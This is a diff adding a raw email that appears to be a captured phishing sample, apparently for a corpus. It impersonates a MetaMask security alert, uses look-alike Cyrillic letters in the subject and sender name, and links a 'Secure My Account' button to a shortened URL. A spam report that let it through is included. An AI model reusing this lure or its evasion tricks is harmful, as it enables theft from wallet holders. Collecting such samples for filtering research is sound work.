@@ -1,0 +1,152 @@
+Return-Path: <postmaster@c0b31e596e.nxcli.io>
+Delivered-To: info@go-onriders.com
+Received: from rin6.dizinc.com
+	by rin6.dizinc.com with LMTP
+	id GJiYDH+HkWiaZBYAQ+45pw
+	(envelope-from <postmaster@c0b31e596e.nxcli.io>)
+	for <info@go-onriders.com>; Tue, 05 Aug 2025 00:24:31 -0400
+Return-path: <postmaster@c0b31e596e.nxcli.io>
+Envelope-to: info@go-onriders.com
+Delivery-date: Tue, 05 Aug 2025 00:24:31 -0400
+Received: from cloudhost-9831112.us-midwest-1.nxcli.net ([8.29.154.12]:63886)
+	by rin6.dizinc.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.2)
+	(envelope-from <postmaster@c0b31e596e.nxcli.io>)
+	id 1uj9Dz-00000006E3w-1DxJ
+	for info@go-onriders.com;
+	Tue, 05 Aug 2025 00:24:31 -0400
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=c0b31e596e.nxcli.io;
+  b=SO4aDg38L1fxyZGYhXMP2SWcLAaJRZJmmJwltvBxUi+3VZkEnUFZA7pP1AA1nurR+tLt0/4zsXiPVl9UCNGZJNOpvhiNVS+KTF4VYjPl75ympy0FsfkqS9jYtOr+HIaEcRn4UAfxgmb2Yp+fkk3ikc+Ue4Dwvj9lHZySRIA5n54EN6XQYgalizsTxXhgmXwY28VTg0noFkA4EV/qJW9xU4ZRZfRA01ufOyt1KUscRqYgYKSqi0jD2urnvFiad3c5ShVmP1fx0CLgoEMFgh7XBFSrJb6kUXhjd3DkJo9IQuIr7RfNFPUjSq4nHbl6md/mtm+tzG08/qB73sZsmjks4Q==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=c0b31e596e.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=I8YETEp8AhWx2V9uV5
+	up7r1/DTlXVLoJ6gr5CqN75iM=; b=l3mYv9zkkBm9nF0Sfb0iBYAW3gVEEogKUX
+	NX5STRCS4OT/mPUQjFBs/oxuW51eYFk7amFYoPX+38osaxqf7CQnSSWl2Zjfx0eo
+	ONyxicImQBnh8WhGjRtqXSd+2ZyLMw0mO5ex8K2gbhOaYEWDal1vaXtTcC8y2Ee0
+	oLMvgPHlIakO1cW5RtDMG60mIM5UAgZcdy/YfBJqNXobj9TsfGlKoUUzjaloc9nH
+	+f8RX8fuBMuFChQLBogZjo/wxl7J6GTGXOlEBTAfupgzofCibQ6xEu3MCPno4ZQ+
+	uA3GQtE9vgJZ21fV/5j65Va9AVVwTSNpZk39sATZjIk8nP3SRCoQ==
+Received: (qmail 18841 invoked by uid 10084); 5 Aug 2025 04:17:09 +0000
+Date: 5 Aug 2025 04:17:09 +0000
+Message-ID: <20250805041709.18834.qmail@cloudhost-9831112.us-midwest-1.nxcli.net>
+To: info@go-onriders.com
+Subject: Sеcurity Аlert — Unrecоgnized Lоgin Attеmpt
+X-PHP-Originating-Script: 10084:raw.php
+From: "MetаMаsk" <8fmkbawq@mzx.io>
+Reply-To: 8fmkbawq@mzx.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@8fmkbawq@mzx.io>
+X-MagicSpam-TUUID: c11852cf-74f5-4d77-8d10-4f7cc60febc8
+X-MagicSpam-SUUID: 6b93503d-f796-4acc-adad-692cfbf5c1ed
+X-Spam-Status: No, score=1.0
+X-Spam-Score: 10
+X-Spam-Bar: +
+X-Ham-Report: Spam detection software, running on the system "rin6.dizinc.com",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  Security Alert: Unrecognized Login Attempt We detected a
+   login attempt to your MetaMask account from a new device or location. If this
+    was not you, your account may be at risk. No, this wasn’t me � [...] 
+ Content analysis details:   (1.0 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was blocked.
+                             See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URI: githubusercontent.com]
+                             [URI: nxcli.io]
+  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [8.29.154.12 listed in sa-accredit.habeas.com]
+  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [8.29.154.12 listed in bl.score.senderscore.com]
+  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                            [8.29.154.12 listed in sa-trusted.bondedsender.org]
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
+  0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
+  0.0 KAM_DMARC_STATUS       Test Rule for DKIM or SPF Failure with Strict
+                             Alignment
+  0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
+                             domains are different
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.7 HTML_IMAGE_ONLY_20     BODY: HTML: images with 1600-2000 bytes of words
+  0.0 KAM_SHORT              Use of a URL Shortener for very short URL
+X-Spam-Flag: NO
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+</head>
+<body style="margin:0; padding:0; background:#f9fafb;">
+  <center style="font-family:Arial, sans-serif; color:#222; padding:20px;">
+
+    <!-- Logo (hosted on a trusted CDN) -->
+    <img
+      src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
+      alt="MetaMask Logo"
+      width="48"
+      style="display:block; margin:0 auto 16px; border:none; outline:none;"
+    />
+
+    <!-- Headline -->
+    <strong style="font-size:18px; color:#f6851b; display:block; margin-bottom:12px;">
+      Security Alert: Unrecognized Login Attempt
+    </strong>
+
+    <!-- Body copy -->
+    <span style="font-size:14px; line-height:1.4; display:block; margin-bottom:16px;">
+      We detected a login attempt to your MetaMask account from a new device or location.<br/>
+      If this was <strong>not you</strong>, your account may be at risk.
+    </span>
+
+    <!-- Call-to-action link as visible text -->
+    <a
+      href="https://t.co/zFFiS20j9y?id=404315656937056261-7702"
+      style="
+        display:inline-block;
+        font-size:14px;
+        font-weight:bold;
+        color:#ffffff;
+        background-color:#f6851b;
+        text-decoration:none;
+        padding:10px 20px;
+        border-radius:4px;
+      "
+    >
+      No, this wasn’t me – Secure My Account
+    </a>
+
+    <!-- Footer copy -->
+    <span style="font-size:12px; color:#666666; display:block; margin:16px 0 0;">
+      Your wallet access may be restricted until you verify this activity.<br/>
+      If you did not request this, please ignore this message.
+    </span>
+
+    <span style="font-size:12px; color:#aaaaaa; display:block; margin-top:8px;">
+      — MetaMask Security Team
+    </span>
+
+  </center>
+</body>
+</html>
+
